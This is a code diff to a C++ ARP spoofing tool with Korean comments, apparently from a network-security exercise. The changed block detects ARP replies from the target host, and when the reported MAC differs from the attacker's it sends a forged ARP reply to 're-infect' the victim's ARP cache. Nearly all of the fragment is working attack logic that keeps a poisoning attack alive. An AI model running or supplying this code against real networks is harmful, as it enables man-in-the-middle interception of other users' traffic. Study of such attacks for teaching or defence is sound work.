@@ -255,26 +255,24 @@ int main(int argc, char* argv[]) {
                 // 🔥 감염 풀림 감지: target → sender 로 진짜 MAC 보냄
                 if (op == ArpHdr::Reply &&
                     sip == conn.target_ip &&
-                    tip == conn.sender_ip &&
-                    smac == conn.target_mac) {
-    
-                    std::cout << "[!] 감염 해제 감지: "
+                    tip == conn.sender_ip) {
+                
+                    std::cout << "[!] ARP Reply 감지: "
                               << std::string(sip) << " → " << std::string(tip)
                               << " (MAC = " << std::string(smac) << ")" << std::endl;
-    
-                    EthArpPacket reinfect = make_arp_packet(
-                        Mac(attacker_mac), conn.sender_mac,
-                        Mac(attacker_mac), conn.sender_mac,
-                        conn.target_ip, conn.sender_ip,
-                        false
-                    );
-                    bool ok = send_arp_packet(handle, reinfect);
-    
-                    std::cout << "[*] 재감염 시도 (Reply 기반): "
-                              << std::string(conn.target_ip) << " → "
-                              << std::string(conn.sender_ip)
-                              << " (보낸 MAC = " << attacker_mac << ") "
-                              << (ok ? "[SENT]" : "[FAILED]") << std::endl;
+                
+                    if (smac != Mac(attacker_mac)) {
+                        std::cout << "[!] 감염이 풀린 것으로 판단됨 → 재감염 시도" << std::endl;
+                
+                        EthArpPacket reinfect = make_arp_packet(
+                            Mac(attacker_mac), conn.sender_mac,
+                            Mac(attacker_mac), conn.sender_mac,
+                            conn.target_ip, conn.sender_ip,
+                            false
+                        );
+                        bool ok = send_arp_packet(handle, reinfect);
+                        std::cout << "[*] 재감염 결과: " << (ok ? "성공 [SENT]" : "실패 [FAILED]") << std::endl;
+                    }
                 }
             }
         }
